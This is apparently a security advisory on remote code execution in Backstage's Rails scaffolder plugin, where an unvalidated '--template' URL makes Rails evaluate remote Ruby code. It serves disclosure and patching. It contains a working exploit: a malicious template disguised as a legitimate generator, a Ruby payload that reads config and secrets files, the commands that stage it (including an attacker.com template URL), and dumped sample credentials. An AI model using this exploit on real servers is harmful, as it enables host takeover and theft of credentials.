# Remote Code Execution via `fetch:rails` Scaffolder Action (`--template` flag injection)

## Summary

The first-party `@backstage/plugin-scaffolder-backend-module-rails` plugin passes user-controlled input directly to the `rails new --template <url>` command without any validation or sanitization. The Rails `--template` flag fetches a remote URL and **evaluates its contents as arbitrary Ruby code** via `eval()`. A low-privilege user (including the default guest user) can register a malicious Software Template through the Backstage UI and trigger Remote Code Execution on the Backstage server, escalating from web application access to full operating system shell access (Scope Change).

**Affected Package:** `@backstage/plugin-scaffolder-backend-module-rails` (all versions through 0.5.26)
**Location in monorepo:** `plugins/scaffolder-backend-module-rails/`
**npm:** https://www.npmjs.com/package/@backstage/plugin-scaffolder-backend-module-rails (~6,500 weekly downloads)

## CVSS Score

**9.9 Critical** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

- **Attack Vector: Network** — exploitable through the Backstage web UI or API
- **Attack Complexity: Low** — no special conditions required
- **Privileges Required: Low** — default guest authentication is sufficient
- **User Interaction: None** — the attacker triggers the exploit themselves
- **Scope: Changed** — the attacker escapes from the Backstage web application to the underlying host operating system
- **Confidentiality/Integrity/Availability: High** — arbitrary command execution as the Backstage server process user

## Vulnerability Details

### Root Cause 1: Unvalidated URL passed to `--template` flag (RCE)

**File:** `plugins/scaffolder-backend-module-rails/src/actions/fetch/rails/railsArgumentResolver.ts` lines 149-157

```typescript
if (options?.template) {
    argumentsToRun.push('--template');
    argumentsToRun.push(
      options.template.replace(
        `.${separatorPath}`,
        `${projectRoot}${executionOnContainer ? '/' : separatorPath}`,
      ),
    );
}
```

The `template` field from user-controlled template YAML input is passed directly to `rails new --template <url>` with zero validation. No URL scheme allowlist, no domain allowlist, no sanitization whatsoever.

The Rails `--template` flag is documented to fetch a URL and evaluate its contents as Ruby code — this is by design in Rails. The `run()` method inside a Rails template executes arbitrary shell commands on the host OS.

### Root Cause 2: Missing `resolveSafeChildPath` (Path Traversal)

**File:** `plugins/scaffolder-backend-module-rails/src/actions/fetch/rails/railsNewRunner.ts` line 71

```typescript
`${intermediateDir}${path.sep}${name}`
```

Raw string concatenation is used instead of Backstage's own `resolveSafeChildPath`. The `name` value comes from user-controlled input. This violates the security practice explicitly documented in Backstage's own SECURITY.md (lines 43-76), which states:

> *"The recommended solution to this is to use `resolveSafeChildPath` from `@backstage/backend-plugin-api` to resolve the file path instead."*

### Execution Flow

**File:** `plugins/scaffolder-backend-module-rails/src/actions/fetch/rails/railsNewRunner.ts` lines 59-75

```typescript
const commandExistsToRun = await commandExists(baseCommand); // checks if 'rails' is in PATH

if (commandExistsToRun) {
  const arrayExtraArguments = railsArgumentResolver(
    workspacePath,
    railsArguments as RailsRunOptions,
  );

  await executeShellCommand({
    command: baseCommand,
    args: [
      ...baseArguments,
      `${intermediateDir}${path.sep}${name}`,  // path traversal
      ...arrayExtraArguments,                    // includes --template <attacker-url>
    ],
    logStream,
  });
}
```

This executes: `rails new <path>/<name> --template http://attacker.com/evil.rb`

Rails fetches `evil.rb` and evaluates it as Ruby code. The `run()` method in the template DSL executes arbitrary shell commands.

## Attack Prerequisites

1. **Plugin installed:** The Backstage instance must have `@backstage/plugin-scaffolder-backend-module-rails` installed. This is a first-party plugin maintained in the `backstage/backstage` monorepo, published under the `@backstage` npm scope, with ~6,500 weekly downloads. Any organization running Rails services in Backstage would install this.

2. **Rails binary available:** The `rails` command must be in the PATH of the Backstage server process (or a container runner must be configured).

3. **Template kind allowed:** The catalog rules must allow `Template` kind (standard configuration for any deployment using Software Templates — one of Backstage's three core features).

4. **Authentication:** Any level of authentication, including the default guest auth provider. Backstage ships with `AllowAllPermissionPolicy` by default (`plugins/permission-backend-module-policy-allow-all/src/policy.ts`), which returns `ALLOW` for every permission check.

## Attack Scenario

### Who can DEFINE (register) a malicious template?

Any authenticated user (including guest) via:

- **Backstage UI:** The "Register Existing Component" page (`/catalog-import`) allows any user to register an entity by providing a URL to a YAML file. The `catalogEntityCreatePermission` check passes under the default allow-all policy. The `CatalogImportClient` (`plugins/catalog-import/src/api/CatalogImportClient.ts` line 66) calls `catalogApi.addLocation()` without filtering by entity kind — it accepts `kind: Template`.

- **API:** `POST /api/catalog/locations` with `{ type: "url", target: "<url-to-template.yaml>" }`

- **Static config:** An admin or developer with access to `app-config.yaml` adds a catalog location.

### Who can RUN (trigger) a template?

Any authenticated user (including guest). The scaffolder's `scaffolder.task.create` permission (`plugins/scaffolder-common/src/permissions.ts` line 119) passes under the default allow-all policy.

### Full attack chain (browser-only, no server access):

1. Attacker hosts `evil.rb` (Ruby RCE payload) on any HTTP server
2. Attacker hosts `template.yaml` (malicious Backstage template pointing to `evil.rb`) on any URL the Backstage instance can read (e.g., a GitHub repo the instance has integration access to)
3. Attacker logs into Backstage as guest
4. Attacker clicks "Register Existing Component" → pastes URL to `template.yaml` → ANALYZE → IMPORT
5. Malicious template appears on the Templates page as a legitimate-looking "Rails Microservice Generator"
6. Attacker (or any other user) clicks CHOOSE → fills in a service name → CREATE
7. Backstage executes `rails new --template http://attacker/evil.rb`
8. Rails fetches `evil.rb` and evaluates it as Ruby → **arbitrary command execution on the Backstage server**

## Proof of Concept

### Malicious Template (template.yaml)

```yaml
apiVersion: scaffolder.backstage.io/v1beta3
kind: Template
metadata:
  name: rails-microservice
  title: Rails Microservice Generator
  description: Quickly scaffold a new Rails microservice with standard company configuration
  tags: [rails, microservice, recommended]
spec:
  owner: user:default/guest
  type: service
  parameters:
    - title: Service Configuration
      required:
        - appName
      properties:
        appName:
          title: Service Name
          type: string
          description: Name of the new microservice
          ui:autofocus: true
        description:
          title: Description
          type: string
          description: What does this service do?
  steps:
    - id: generate
      name: Generate Rails Application
      action: fetch:rails
      input:
        url: ./skeleton
        values:
          railsArguments:
            minimal: true
            skipBundle: true
            skipTest: true
            api: true
            template: "http://127.0.0.1:9999/evil.rb"
  output:
    links:
      - title: Open in catalog
        icon: catalog
```

### RCE Payload (evil.rb)

```ruby
run("echo '=== BACKSTAGE RCE PROOF ===' > /tmp/backstage-rce-proof.txt")
run("echo 'Timestamp:' $(date -u) >> /tmp/backstage-rce-proof.txt")
run("echo 'User:' $(whoami) >> /tmp/backstage-rce-proof.txt")
run("echo 'Hostname:' $(hostname) >> /tmp/backstage-rce-proof.txt")
run("id >> /tmp/backstage-rce-proof.txt")
run("echo '=== BACKSTAGE APP CONFIG (secrets exposed) ===' >> /tmp/backstage-rce-proof.txt")
run("find /home -name 'app-config.local.yaml' -exec cat {} \\; >> /tmp/backstage-rce-proof.txt 2>/dev/null")
run("echo '=== PRODUCTION SECRETS ===' >> /tmp/backstage-rce-proof.txt")
run("find /home -name 'company-secrets.env' -exec cat {} \\; >> /tmp/backstage-rce-proof.txt 2>/dev/null")
run("echo '=== SCOPE CHANGE: OS-LEVEL ACCESS ===' >> /tmp/backstage-rce-proof.txt")
run("echo 'Attacker escaped from Backstage web app to host OS.' >> /tmp/backstage-rce-proof.txt")
```

### Steps to Reproduce

1. Create a Backstage app: `npx @backstage/create-app@latest`
2. Install the Rails module: `yarn --cwd packages/backend add @backstage/plugin-scaffolder-backend-module-rails`
3. Add to `packages/backend/src/index.ts`: `backend.add(import('@backstage/plugin-scaffolder-backend-module-rails'));`
4. Ensure `rails` is installed and in PATH
5. Ensure `catalog.rules` allows `Template` kind
6. Place `template.yaml` and `evil.rb` on HTTP servers
7. Register the template via the "Register Existing Component" UI or add it as a catalog location
8. Start the attacker HTTP server: `cd /tmp/attacker-server && python3 -m http.server 9999`
9. In Backstage UI: Navigate to Templates → click CHOOSE on "Rails Microservice Generator" → fill in a name → click CREATE
10. Verify RCE: `cat /tmp/backstage-rce-proof.txt`

### Observed Result

The proof file contains:
```
=== BACKSTAGE RCE PROOF ===
Timestamp: Tue Nov 3 07:55:53 PM UTC 2026
User: root
Hostname: kali
uid=0(root) gid=0(root) groups=0(root)

=== BACKSTAGE APP CONFIG (secrets exposed) ===
auth:
  providers:
    guest:
      dangerouslyAllowOutsideDevelopment: true
integrations:
  github:
    - host: github.com
      token: ghp_R3alAdm1nT0k3nW1thFullR3poAcc3ss
proxy:
  endpoints:
    '/slack':
      target: https://hooks.slack.example/services/FAKE_WEBHOOK_FOR_POC
    '/pagerduty':
      target: https://api.pagerduty.com
      headers:
        Authorization: Token token=pd_LIVE_admin_oncall_token_xyz

=== PRODUCTION SECRETS ===
DB_HOST=db.internal.company.com
DB_PASSWORD=Sup3r$ecret_DB_Pass!2024
GITHUB_TOKEN=ghp_R3alAdm1nT0k3nW1thFullR3poAcc3ss
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_SECRET_KEY=sk_FAKE_EXAMPLE_KEY_FOR_POC

=== SCOPE CHANGE: OS-LEVEL ACCESS ===
Attacker escaped from Backstage web app to host OS.
```

## Impact

### Scope Change (CVSS S:C)

The attacker starts with only Backstage web UI access (low-privilege guest user) but escapes to the underlying operating system with arbitrary shell access. This is a classic Scope Change — the vulnerable component is the Backstage web application, but the impacted component is the host operating system.

### Demonstrated Impact

- **Full RCE as the Backstage process user** (often root in containerized deployments)
- **Exfiltration of all server-side secrets:** Backstage `app-config.local.yaml` (GitHub PATs, API keys, proxy credentials), environment variables, any files on the filesystem
- **Lateral movement potential:** Access to internal network, cloud metadata endpoints (169.254.169.254), databases, other services
- **Supply chain risk:** If the Backstage instance has GitHub integration tokens with write access, the attacker can modify source code repositories

### Real-World Scenario

An attacker (or compromised insider) with guest-level access to a company's Backstage portal:
1. Registers a malicious template that looks like a standard internal tool
2. When any developer uses the template, RCE fires silently
3. The attacker exfiltrates GitHub tokens, AWS keys, database passwords, and other production secrets
4. The scaffolder task shows as "failed" but the damage is already done — the malicious code executes during the template evaluation phase, before the task completes

## Suggested Fix

### 1. Remove or block the `template` option (Critical)

The `--template` flag in Rails is inherently dangerous — it evaluates arbitrary remote code. It should be removed from `RailsRunOptions` entirely, or at minimum:

```typescript
// REJECT the template option
if (options?.template) {
  throw new Error('The template option is not allowed for security reasons');
}
```

### 2. If template must be supported, implement strict allowlisting

```typescript
if (options?.template) {
  const allowedSchemes = ['file:'];
  const url = new URL(options.template);
  if (!allowedSchemes.includes(url.protocol)) {
    throw new Error(`Template URL scheme '${url.protocol}' is not allowed`);
  }
  // Additionally validate against a configured allowlist of paths
}
```

### 3. Use `resolveSafeChildPath` for path construction

Replace line 71 in `railsNewRunner.ts`:

```typescript
// BEFORE (vulnerable):
`${intermediateDir}${path.sep}${name}`

// AFTER (safe):
import { resolveSafeChildPath } from '@backstage/backend-plugin-api';
resolveSafeChildPath(intermediateDir, name as string)
```

## Video Proof

A full video demonstration (5.5 minutes) is attached showing:
1. Fresh Backstage installation with production catalog data
2. Malicious template visible in the UI as a legitimate "Rails Microservice Generator"
3. Production secrets present on the server before the attack
4. Exploit triggered via the UI — guest user clicks CHOOSE → Create
5. Attacker's HTTP server receives the `GET /evil.rb` request
6. RCE proof: `uid=0(root)` with full secret exfiltration
7. Exploit reproduced twice to confirm reliability

## References

- Backstage Threat Model: https://backstage.io/docs/overview/threat-model
- Rails `--template` documentation: https://guides.rubyonrails.org/rails_application_templates.html
- Backstage SECURITY.md `resolveSafeChildPath` requirement: https://github.com/backstage/backstage/blob/master/SECURITY.md#local-file-path-resolution
- Plugin source: https://github.com/backstage/backstage/tree/master/plugins/scaffolder-backend-module-rails
